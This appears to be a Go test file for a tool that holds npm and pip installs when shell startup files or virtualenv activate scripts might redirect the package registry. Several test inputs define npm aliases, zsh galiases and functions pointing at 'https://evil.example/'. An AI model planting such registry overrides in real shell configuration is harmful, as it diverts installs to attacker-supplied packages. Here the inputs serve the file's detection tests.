//go:build unix

package main

import (
	"path/filepath"
	"testing"
)

// REPO-POL-NPMRC round 5 (ADR-0174 round 10, re-review of ac912da): the last install command, a sourced script's own
// indirections, the real activate scripts, assignments by expansion, quoted and zsh aliases, a bare export.

// A sourced script that loads what this reader cannot see.
func TestRound10SourcedIndirection(t *testing.T) {
	for _, c := range []struct{ name, body, want string }{
		{"a command's output", "PROMPT_X=$(cat /srv/x)\n", "hold"},
		{"a backtick", "PROMPT_X=`cat /srv/x`\n", "hold"},
		{"source", "source /srv/env.sh\n", "hold"},
		{"eval", "eval \"export A=1\"\n", "hold"},
		{"an if around a dot", "if true; then . /srv/env.sh; fi\n", "hold"},
		{"the relocatable form for another name", "npm_config_registry=''\"$(dirname -- \"$(dirname -- \"$(realpath -- \"$SCRIPT_PATH\")\")\")\"''\n", "hold"},
		{"the activate scripts' forms, not a template (round 11)", "case \"$(uname)\" in\n    CYGWIN*|MSYS*|MINGW*)\n        VIRTUAL_ENV=$(cygpath '/srv/v')\n        ;;\nesac\nVIRTUAL_ENV_PROMPT=$(basename \"$VIRTUAL_ENV\")\necho \"You must source this script: \\$ source $0\" >&2\n", "hold"},
	} {
		_, _, cwd := npmWorkspace(t)
		v := filepath.Join(cwd, "v")
		mkdir(t, filepath.Join(v, "bin"))
		write(t, filepath.Join(v, "bin", "activate"), c.body)
		if form, stderr := round7(t, cwd, ". v/bin/activate && npm i @acme/cli", nil); form != c.want {
			t.Errorf("%s: %s, want %s (stderr %q)", c.name, form, c.want, stderr)
		}
	}
	// VIRTUAL_ENV's own forms, for a pip install
	for _, c := range []struct{ name, body, want string }{
		{"cygpath of VIRTUAL_ENV before it is set", "VIRTUAL_ENV=$(cygpath -u \"$VIRTUAL_ENV\")\n", "hold"},
		{"cygpath -w of a path, not a template (round 11)", "VIRTUAL_ENV=$(cygpath -w '/srv/v')\nexport VIRTUAL_ENV\n", "hold"},
	} {
		_, _, cwd := npmWorkspace(t)
		v := filepath.Join(cwd, "v")
		mkdir(t, filepath.Join(v, "bin"))
		write(t, filepath.Join(v, "bin", "activate"), c.body)
		if form, stderr := round7(t, cwd, ". v/bin/activate && pip install acme-tools==2.0.1", nil); form != c.want {
			t.Errorf("%s: %s, want %s (stderr %q)", c.name, form, c.want, stderr)
		}
	}
}

func TestRound10StartupForms(t *testing.T) {
	for _, c := range []struct{ name, file, body, cmd, want string }{
		{"${NAME:?}", ".zshenv", ": ${npm_config_registry:?set it}\n", "", "hold"},
		{"${NAME:-} reads", ".zshenv", "echo ${npm_config_registry:-none}\n", "", "silent"},
		{"another name's ${…:=…}", ".zshenv", ": ${EDITOR:=vim}\n", "", "silent"},
		{"a double-quoted alias pair", ".zshrc", "alias \"npm=npm --registry=https://evil.example/\"\n", "", "hold"},
		{"zsh's galiases", ".zshrc", "galiases[npm]='npm --registry=https://evil.example/'\n", "", "hold"},
		{"zsh's functions, added", ".zshrc", "functions+=(npm 'command npm --registry=https://evil.example/ \"$@\"')\n", "", "hold"},
		{"zsh's aliases of another program", ".zshrc", "aliases[ll]='ls -l'\n", "", "silent"},
		{"a bare export", ".zshrc", "export npm_config_registry\n", "", "hold"},
		{"an export after its assignment", ".zshrc", "npm_config_registry=https://registry.npmjs.org/\nexport npm_config_registry\n", "", "silent"},
		{"a bare export of VIRTUAL_ENV", ".profile", "export VIRTUAL_ENV\n", "pip install acme-tools==2.0.1", "hold"},
		{"a bare export of another name", ".zshrc", "export EDITOR PAGER\n", "", "silent"},
		{"a quoted value built further", ".zshrc", "export npm_config_registry='https://registry.npmjs.org/'$(cat /srv/r)\n", "", "hold"},
		{"a double-quoted value built further", ".zshrc", "export npm_config_registry=\"https://registry.npmjs.org/\"\"$R\"\n", "", "hold"},
		{"a quoted value and a comment", ".zshrc", "export npm_config_registry='https://registry.npmjs.org/' # npm's\n", "", "silent"},
		{"a quoted value and another command", ".zshrc", "export npm_config_registry='https://registry.npmjs.org/'; export EDITOR=vim\n", "", "silent"},
	} {
		_, _, cwd := npmWorkspace(t)
		home := t.TempDir()
		write(t, filepath.Join(home, c.file), c.body)
		cmd := c.cmd
		if cmd == "" {
			cmd = "npm i @acme/cli"
		}
		if form, stderr := round7(t, cwd, cmd, npmrcFiles(t, "", home, nil, nil)); form != c.want {
			t.Errorf("%s: %s, want %s (stderr %q)", c.name, form, c.want, stderr)
		}
	}
}

func TestRound10InstallPart(t *testing.T) {
	for _, c := range []struct{ line, want string }{
		{"npm i x; cd /srv && npm i x", "npm i x; cd /srv && npm i x"},
		{"npm i x && npm test && npm i y", "npm i x && npm test && npm i y"},
		{"npm i x && npm i x && npm test", "npm i x && npm i x "},
		{"cd a\nnpm i x\nnpm test", "cd a\nnpm i x"},
		{"npm i x | tee log && npm test", "npm i x | tee log "},
	} {
		if got := installPart(c.line); got != c.want {
			t.Errorf("%q: %q, want %q", c.line, got, c.want)
		}
	}
}
